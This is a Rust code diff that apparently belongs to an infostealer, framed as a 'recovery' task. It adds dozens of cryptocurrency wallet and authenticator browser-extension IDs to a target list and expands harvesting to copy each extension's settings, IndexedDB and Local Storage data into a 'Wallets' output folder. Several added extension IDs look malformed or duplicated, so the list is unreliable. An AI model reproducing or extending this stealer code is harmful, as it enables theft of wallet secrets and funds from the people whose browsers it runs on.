@@ -236,6 +236,54 @@ const TARGET_EXTENSIONS: &[(&str, &str)] = &[
     ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
     ("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
     ("Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
+    ("Yoroi", "ffnbelfdoeioaeonhjbnjfmkonbpphgo"),
+    ("Sollet", "fhmfbegecebeonpjjmbbpccclghjbhcl"),
+    ("OKX Wallet", "mclkkofklkfljcocclepkeepbbeeeocl"),
+    ("Authenticator", "bhghoamapcdpobmchallangeid"),
+    ("Math Wallet", "afbcbbaebocleolnjfgobidebfbbidnf"),
+    ("Exodus Web3", "aholpfdialccbhicgbbehbafndfillid"),
+    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
+    ("BitKeep", "jiidiaalihomgebjjocbdghipdbncbda"),
+    ("Solflare", "bhhhlbcehkeepbhfofnnjkbeueononhe"),
+    ("Rabby Wallet", "acmacmhlonlcgoaoihhmhfbbemndbagc"),
+    ("Kaikas", "jblndmgejeenekfeiljndjkbbunba"),
+    ("Terra Station", "aiifnbfmplejblepbghpkeccgpobhlpk"),
+    ("Keplr", "dmkamcknogkgcdfhhbddcghachpanceb"),
+    ("GeroWallet", "bgpipimicnnhedneaaggifneimhlakdq"),
+    ("Martian Wallet", "efbglgofoippbgadhlgakkebhffoibda"),
+    ("Petra Wallet", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
+    ("Pontem Wallet", "phkbamefinggnoigpghpacnppfbcocll"),
+    ("Fewcha Wallet", "ebfidppbeapgggoabnmphhconihbaloo"),
+    ("Ethos Wallet", "mcbigmjiafegjgebiogimnoicpddidoh"),
+    ("Sui Wallet", "opcgpfmccihajmfhljleebpepfdboncl"),
+    ("Nami", "lpchoebaghpjnleebgfbediaeaebdebe"),
+    ("Maiar DeFi Wallet", "dkhoceliihnoosnmankmglehlachmcoc"),
+    ("Authenticator 2", "ocglpnciphfbiokegecmnoaocnhfdmmp"),
+    ("Guarda", "hpglfhgfnhbgpjpfpgjicgln"),
+    ("Jaxx Liberty", "cjelfplplepabbackneaniopclgppcll"),
+    ("Wombat", "amjlehdcaognenonmdeunonlgdbmmobe"),
+    ("MEW CX", "nlbmnnijcnlegmoebonhpfbhbopfdcom"),
+    ("Saturn Wallet", "nkddgncdjgjfcddabkaicgepbbndgcon"),
+    ("ZilPay", "klnaejjgbibmccnnocpknocnmedeecce"),
+    ("Ever Wallet", "npkejubjmaphclfkjcladhpkogmhcobk"),
+    ("Braavos", "ohenlellnohplepnedmjalpakoebmjid"),
+    ("Argent X", "dlcobpjiigpikoechnabeenhconllbop"),
+    ("Slope Wallet", "pocmplpaccclhnjgdigolocialocnnhl"),
+    ("Kardiachain", "pdadjkfkgcafgbceimclbndnlnnbiidk"),
+    ("Leap Terra", "ndijmbeodpejfibkhbaemojingniedcl"),
+    ("SubWallet", "onhogfjephnmsgpfphnngncjgepkckhf"),
+    ("Polkadot{.js}", "mopnnhnimadngocjndndjeobkocflbcl"),
+    ("Talisman", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
+    ("Enkrypt", "pncajimpkhpcedicglagiedpemhgbedf"),
+    ("SafePal", "lgmpdoooghpkibfooqebeunackpkamca"),
+    ("Xverse", "idnnbpkonabnnocdbimnboakidmojgiu"),
+    ("Leather", "ldojebmookaiafnpeclbiiknphhbhnjd"),
+    ("UniSat", "ppbibelpcjmhbdihakhencnbalnplehc"),
+    ("OneKey", "jojhbbmbiameaonhbeidepcongalmeta"),
+    ("Core", "agoakfeocalloabgjbebhocmclnnoocg"),
+    ("Bitski", "mooonnbaicgjjobndhkgebeobhkeimbi"),
+    ("Venom", "nanjmgljbomhgeclgabbbiuabj"),
+    ("Rise Wallet", "jojhbbmbiameaonhbeidepcongalmeta"),
 ];
 
 #[async_trait]
@@ -255,24 +303,68 @@ impl RecoveryTask for BrowserExtensionTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let local_ext_settings = self.profile.path.join("Local Extension Settings");
-
-        if fs::metadata(&local_ext_settings).await.is_err() {
-            return Ok(artifacts);
-        }
+        let indexed_db = self.profile.path.join("IndexedDB");
+        let local_storage = self.profile.path.join("Local Storage").join("leveldb");
 
         for (name, id) in TARGET_EXTENSIONS {
-            let extension_dir = local_ext_settings.join(id);
-            if fs::metadata(&extension_dir).await.is_ok() {
+            // 1. Grab Local Extension Settings
+            let extension_settings_dir = local_ext_settings.join(id);
+            if fs::metadata(&extension_settings_dir).await.is_ok() {
                 let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
-                    "{}_{}_{}",
+                    "{}_{}_{}_Settings",
                     self.profile.browser.label(),
                     self.profile.profile_name,
                     name
                 ));
-                fs::create_dir_all(&dest_root).await?;
+                let _ = fs::create_dir_all(&dest_root).await;
+                let _ = copy_dir_limited(&extension_settings_dir, &dest_root, name, &mut artifacts, usize::MAX, 0).await;
+            }
 
-                copy_dir_limited(&extension_dir, &dest_root, name, &mut artifacts, usize::MAX, 0)
-                    .await?;
+            // 2. Grab IndexedDB data
+            // Usually formatted as: chrome-extension_[id]_0.indexeddb.leveldb
+            if fs::metadata(&indexed_db).await.is_ok() {
+                let mut dir = fs::read_dir(&indexed_db).await?;
+                while let Some(entry) = dir.next_entry().await? {
+                    let fname = entry.file_name().to_string_lossy().to_string();
+                    if fname.contains(id) {
+                        let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
+                            "{}_{}_{}_IndexedDB",
+                            self.profile.browser.label(),
+                            self.profile.profile_name,
+                            name
+                        ));
+                        let _ = fs::create_dir_all(&dest_root).await;
+                        let _ = copy_dir_limited(&entry.path(), &dest_root.join(&fname), name, &mut artifacts, usize::MAX, 0).await;
+                    }
+                }
+            }
+
+            // 3. Grab Local Storage leveldb data for the extension
+            if fs::metadata(&local_storage).await.is_ok() {
+                 let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
+                    "{}_{}_{}_Storage",
+                    self.profile.browser.label(),
+                    self.profile.profile_name,
+                    name
+                ));
+                
+                let mut dir = fs::read_dir(&local_storage).await?;
+                while let Some(entry) = dir.next_entry().await? {
+                    let fname = entry.file_name().to_string_lossy().to_string();
+                    if fname.contains(id) {
+                         let _ = fs::create_dir_all(&dest_root).await;
+                         let target = dest_root.join(&fname);
+                         if let Ok(_) = fs::copy(entry.path(), &target).await {
+                             let meta = fs::metadata(&target).await?;
+                             artifacts.push(RecoveryArtifact {
+                                 label: format!("{} Storage", name),
+                                 path: target,
+                                 size_bytes: meta.len(),
+                                 modified: meta.modified().ok(),
+                             });
+                         }
+                    }
+                }
             }
         }
 
